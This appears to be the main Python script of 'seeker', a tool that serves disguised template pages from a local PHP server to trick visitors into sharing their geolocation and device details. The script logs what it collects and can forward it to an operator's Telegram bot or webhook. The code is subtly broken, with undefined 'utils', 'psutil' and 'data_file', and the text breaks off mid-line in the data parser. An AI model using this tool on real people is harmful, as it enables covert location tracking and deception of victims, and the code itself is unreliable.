#!/usr/bin/env python3

VERSION = '1.3.1'

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow

import sys
import argparse
import requests
import traceback
import shutil
from time import sleep
from os import path, kill, mkdir, getenv, environ, remove, devnull, path as ospath
from json import loads, decoder
from packaging import version
import socket
import importlib
from csv import writer
import subprocess as subp
from ipaddress import ip_address
from signal import SIGTERM

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml', help='KML filename')
parser.add_argument('-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]')
parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
parser.add_argument('-v', '--version', action='store_true', help='Prints version')
parser.add_argument('-t', '--template', type=int, help='Load template and loads parameters from env variables')
parser.add_argument('-d', '--debugHTTP', action='store_true', default=False, help='Disable HTTPS redirection for testing only')
parser.add_argument('-tg', '--telegram', help='Telegram bot API token [ Format -> token:chatId ]')
parser.add_argument('-wh', '--webhook', help='Webhook URL [ POST method & unauthenticated ]')

args = parser.parse_args()
kml_fname = args.kml
port = getenv('PORT') or args.port
chk_upd = args.update
print_v = args.version
telegram = getenv('TELEGRAM') or args.telegram
webhook = getenv('WEBHOOK') or args.webhook
debug_http = (getenv('DEBUG_HTTP') and getenv('DEBUG_HTTP').lower() == 'true') or args.debugHTTP

if debug_http:
    environ['DEBUG_HTTP'] = '1'
else:
    environ['DEBUG_HTTP'] = '0'

templateNum = None
if getenv('TEMPLATE'):
    try:
        templateNum = int(getenv('TEMPLATE'))
    except ValueError:
        print(f"{Y}[!] Warning: TEMPLATE environment variable is not a valid integer.{W}")
else:
    templateNum = args.template

path_to_script = ospath.dirname(ospath.realpath(__file__))

SITE = ''
SERVER_PROC = ''
LOG_DIR = ospath.join(path_to_script, 'logs')
DB_DIR = ospath.join(path_to_script, 'db')
LOG_FILE = ospath.join(LOG_DIR, 'php.log')
DATA_FILE = ospath.join(DB_DIR, 'results.csv')
INFO = ospath.join(LOG_DIR, 'info.txt')
RESULT = ospath.join(LOG_DIR, 'result.txt')
TEMPLATES_JSON = ospath.join(path_to_script, 'template', 'templates.json')
TEMP_KML = ospath.join(path_to_script, 'template', 'sample.kml')
META_FILE = ospath.join(path_to_script, 'metadata.json')
META_URL = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/metadata.json'
PID_FILE = ospath.join(path_to_script, 'pid')

if not ospath.isdir(LOG_DIR):
    mkdir(LOG_DIR)

if not ospath.isdir(DB_DIR):
    mkdir(DB_DIR)


def chk_update():
    try:
        print('> Fetching Metadata...', end='')
        rqst = requests.get(META_URL, timeout=5)
        rqst.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
        metadata = rqst.text
        json_data = loads(metadata)
        gh_version = json_data['version']
        if version.parse(gh_version) > version.parse(VERSION):
            print(f'OK\n> New Update Available : {gh_version}')
        else:
            print('OK\n> Already up to date.')
    except requests.exceptions.RequestException as exc:
        utils.print(f'{R}[-] Exception during update check: {str(exc)}{W}')
    except decoder.JSONDecodeError as exc:
        utils.print(f'{R}[-] Error decoding metadata: {str(exc)}{W}')
    except Exception as exc:
        utils.print(f'{R}[-] An unexpected error occurred during update check: {str(exc)}{W}')


def banner():
    try:
        with open(META_FILE, 'r') as metadata:
            json_data = loads(metadata.read())
            twitter_url = json_data['twitter']
            comms_url = json_data['comms']

        art = r'''
                        __
  ______  ____   ____  |  | __  ____ _______
 /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
 \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
/____  > \___  >\___  >|__|_ \ \___  >|__|
     \/      \/     \/      \/     \/'''
        utils.print(f'{G}{art}{W}\n')
        utils.print(f'{G}[>] {C}Created By   : {W}thewhiteh4t')
        utils.print(f'{G} |---> {C}Twitter   : {W}{twitter_url}')
        utils.print(f'{G} |---> {C}Community : {W}{comms_url}')
        utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')
    except FileNotFoundError:
        utils.print(f'{R}[-] Error: metadata.json not found.{W}')
        sys.exit(1)
    except decoder.JSONDecodeError:
        utils.print(f'{R}[-] Error: Could not decode metadata.json.{W}')
        sys.exit(1)
    except Exception as exc:
        utils.print(f'{R}[-] An unexpected error occurred during banner display: {str(exc)}{W}')
        sys.exit(1)


def send_webhook(content, msg_type):
    if webhook is not None:
        if not webhook.lower().startswith('http://') and not webhook.lower().startswith('https://'):
            utils.print(f'{R}[-] {C}Protocol missing in webhook URL, include http:// or https://{W}')
            return
        try:
            if webhook.lower().startswith('https://discord.com/api/webhooks'):
                from discord_webhook import discord_sender
                discord_sender(webhook, msg_type, content)
            else:
                requests.post(webhook, json=content, timeout=5)
        except requests.exceptions.RequestException as exc:
            utils.print(f'{R}[-] Error sending webhook: {str(exc)}{W}')
        except ImportError:
            utils.print(f'{R}[-] Error: discord_webhook module not found. Install it with: pip install discord-webhook{W}')


def send_telegram(content, msg_type):
    if telegram is not None:
        tmpsplit = telegram.split(':')
        if len(tmpsplit) < 2:
            utils.print(f'{R}[-] {C}Telegram API token invalid! Format -> token:chatId{W}')
            return
        try:
            from telegram_api import tgram_sender
            tgram_sender(msg_type, content, tmpsplit)
        except ImportError:
            utils.print(f'{R}[-] Error: telegram_api module not found. Ensure it's in the same directory.{W}')
        except Exception as exc:
            utils.print(f'{R}[-] Error sending Telegram message: {str(exc)}{W}')


def template_select(site):
    utils.print(f'{Y}[!] Select a Template :{W}\n')

    try:
        with open(TEMPLATES_JSON, 'r') as templ:
            templ_info = templ.read()
        templ_json = loads(templ_info)

        for index, item in enumerate(templ_json['templates']):
            name = item['name']
            utils.print(f'{G}[{index}] {C}{name}{W}')

        selected = -1
        if templateNum is not None:
            if 0 <= templateNum < len(templ_json['templates']):
                selected = templateNum
            else:
                print()
                utils.print(f'{R}[-] {C}Invalid template number provided.{W}')
                sys.exit(1)
        else:
            while selected < 0 or selected >= len(templ_json['templates']):
                try:
                    selected_str = input(f'{G}[>] {W}')
                    selected = int(selected_str)
                    if not (0 <= selected < len(templ_json['templates'])):
                        print()
                        utils.print(f'{R}[-] {C}Invalid Input! Please enter a number from the list.{W}')
                except ValueError:
                    print()
                    utils.print(f'{R}[-] {C}Invalid Input! Please enter a number.{W}')
                    sys.exit(1)

        print()
        utils.print(f'{G}[+] {C}Loading {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}')

        selected_template = templ_json['templates'][selected]
        site = selected_template['dir_name']
        imp_file = selected_template['import_file']

        try:
            importlib.import_module(f'template.{imp_file}')
            shutil.copyfile('php/error.php', ospath.join('template', site, 'error_handler.php'))
            shutil.copyfile('php/info.php', ospath.join('template', site, 'info_handler.php'))
            shutil.copyfile('php/result.php', ospath.join('template', site, 'result_handler.php'))
            jsdir = ospath.join('template', site, 'js')
            if not ospath.isdir(jsdir):
                mkdir(jsdir)
            shutil.copyfile('js/location.js', ospath.join(jsdir, 'location.js'))
            return site

        except ImportError as exc:
            print()
            utils.print(f'{R}[-] {C}Error importing template file {imp_file}: {exc}{W}')
            sys.exit(1)
        except FileNotFoundError as exc:
            print()
            utils.print(f'{R}[-] {C}Error copying PHP or JS files: {exc}{W}')
            sys.exit(1)

    except FileNotFoundError:
        print()
        utils.print(f'{R}[-] {C}Error: templates.json not found.{W}')
        sys.exit(1)
    except decoder.JSONDecodeError:
        print()
        utils.print(f'{R}[-] {C}Error: Could not decode templates.json.{W}')
        sys.exit(1)
    except Exception as exc:
        print()
        utils.print(f'{R}[-] {C}An unexpected error occurred during template selection: {exc}{W}')
        sys.exit(1)


def server(site, port, pid_file, log_file):
    print()
    port_free = False
    utils.print(f'{G}[+] {C}Port : {W}{port}\n')
    utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
    cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', ospath.join('template', site)]

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect(('127.0.0.1', port))
        except ConnectionRefusedError:
            port_free = True

    if not port_free and ospath.exists(pid_file):
        try:
            with open(pid_file, 'r') as pid_info:
                pid = int(pid_info.read().strip())
            try:
                old_proc = psutil.Process(pid)
                utils.print(f'{C}[ {R}✘{C} ]{W}')
                utils.print(f'{Y}[!] Old instance of php server found, restarting...{W}')
                utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
                sleep(1)
                if old_proc.status() != 'running':
                    old_proc.kill()
                else:
                    utils.print(f'{C}[ {R}✘{C} ]{W}')
                    utils.print(f'{R}[-] {C}Unable to kill php server process (PID: {pid}), kill manually{W}')
                    sys.exit(1)
            except psutil.NoSuchProcess:
                pass
        except FileNotFoundError:
            pass  # PID file might have been deleted
        except ValueError:
            utils.print(f'{R}[-] {C}Error reading PID from file. Please check {pid_file}{W}')
            sys.exit(1)
        except psutil.NoSuchProcess:
            pass
    elif not port_free:
        utils.print(f'{C}[ {R}✘{C} ]{W}')
        utils.print(f'{R}[-] {C}Port {W}{port} {C}is being used by some other service.{W}')
        sys.exit(1)

    try:
        with open(log_file, 'w') as phplog:
            proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
            with open(pid_file, 'w') as pid_out:
                pid_out.write(str(proc.pid))

            sleep(3)

            try:
                php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html', timeout=5)
                php_rqst.raise_for_status()
                utils.print(f'{C}[ {G}✔{C} ]{W}')
                print()
                return proc  # Return the process object
            except requests.exceptions.RequestException as exc:
                utils.print(f'{C}[ {R}Status : {php_rqst.status_code if hasattr(php_rqst, "status_code") else exc}{C} ]{W}')
                cl_quit(pid_file, proc.pid if 'proc' in locals() and proc else None)
            except requests.ConnectionError:
                utils.print(f'{C}[ {R}✘{C} ]{W}')
                cl_quit(pid_file, proc.pid if 'proc' in locals() and proc else None)
        return None  # Should not reach here if server starts
    except Exception as exc:
        utils.print(f'{R}[-] An unexpected error occurred while starting the server: {exc}{W}')
        return None


def wait(result_file, info_file):
    printed = False
    while True:
        sleep(2)
        try:
            size = ospath.getsize(result_file)
            if size == 0 and not printed:
                utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
                printed = True
            elif size > 0:
                data_parser(result_file, info_file, data_file, kml_fname)
                printed = False
                # Clear the result file immediately after parsing
                with open(result_file, 'w'):
                    pass
                with open(info_file, 'w'):
                    pass
        except FileNotFoundError:
            utils.print(f'{R}[-] Error: Result or info file not found.{W}')
        except OSError as e:
            utils.print(f'{R}[-] OS error while checking file size: {e}{W}')


def data_parser(result_file, info_file, data_file, kml_fname):
    data_row = []
    try:
        with open(info_file, 'r') as info_f:
            info_content = info_f.read().strip()
        if info_content:
            try:
                info_json = loads(info_content)
                var_os = info_json.get('os', 'N/A')
                var_platform = info_json.get('platform', 'N/A')
                var_cores = info_json.get('cores', 'N/A')
                var_ram = info_json.get('ram', 'N/A')
                var_vendor = info_json.get('vendor', 'N/A')
                var_render = info_json.get('render', 'N/A')
                var_res = f"{info_json
